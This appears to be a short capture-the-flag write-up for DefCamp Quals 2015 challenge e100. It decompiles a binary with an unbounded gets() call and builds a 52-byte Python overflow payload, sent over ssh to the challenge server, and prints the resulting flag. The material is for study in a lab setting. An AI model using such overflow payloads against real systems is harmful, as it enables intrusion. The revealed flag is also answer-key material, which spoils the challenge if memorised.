{"pageContext":{"html":"<p><a href=\"ctf=defcamp-quals-2015\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=buffer-overflow\"></a></p>\n<p>We are given a <a href=\"/e100-256a13d7efa7c32e0efb75e441f46abe.bin\">binary</a> and a <a href=\"/id_rsa_e100-f3a8a5e6f4a1d398c4009207dfbb1ed4.\">key</a>.</p>\n<pre><code class=\"language-bash\">$  file e100.bin \ne100.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4410355efef2e99ac54e4028dba1b3e40d055fee, stripped\n</code></pre>\n<p>Also loading in gdb-peda.</p>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n</code></pre>\n<p>Good. Loading the binary in <a href=\"http://www.hopperapp.com/\">Hopper</a> and decompiling.</p>\n<pre><code class=\"language-c\">function sub_80484fd {\n    var_C = *0x14;\n    printf(\"Enter password: \");\n    gets(var_2C);\n    if (arg0 == 0xbadb0169) {\n            system(\"cat flag\");\n    }\n    else {\n            for (var_30 = 0x0; var_30 &#x3C; strlen(var_2C); var_30 = var_30 + 0x1) {\n                    *(int8_t *)(var_30 + var_2C) = arg0 ^ *(int8_t *)(var_30 + var_2C) &#x26; 0xff;\n            }\n            printf(\"Your new secure password is: \");\n            printf(var_2C);\n    }\n    eax = var_C ^ *0x14;\n    COND = eax == 0x0;\n    if (!COND) {\n            eax = __stack_chk_fail();\n    }\n    return eax;\n}\n</code></pre>\n<p>So a gets and a static hardcoded check. Basic buffer overflow!!</p>\n<pre><code class=\"language-bash\">   0x804851b:   lea    eax,[ebp-0x2c]\n   0x804851e:   mov    DWORD PTR [esp],eax\n=> 0x8048521:   call   0x80483a0 &#x3C;gets@plt>\n   0x8048526:   cmp    DWORD PTR [ebp+0x8],0xbadb0169\n</code></pre>\n<p>This gives us padding = 0x2c+0x8 = 52\nNow the final blow.</p>\n<pre><code class=\"language-bash\">$ python -c \"print 'A'*52+'\\xba\\xdb\\x01\\x69'[::-1]\" | ssh -i id_rsa_e100 dctf@10.13.37.6\nPseudo-terminal will not be allocated because stdin is not a terminal.\nDCTF{3671bacdb5ea5bc26982df7da6de196e}\nEnter password: *** stack smashing detected ***: /home/dctf/e100 terminated\n</code></pre>\n<p>Flag:</p>\n<blockquote>\n<p>DCTF{3671bacdb5ea5bc26982df7da6de196e}</p>\n</blockquote>"}}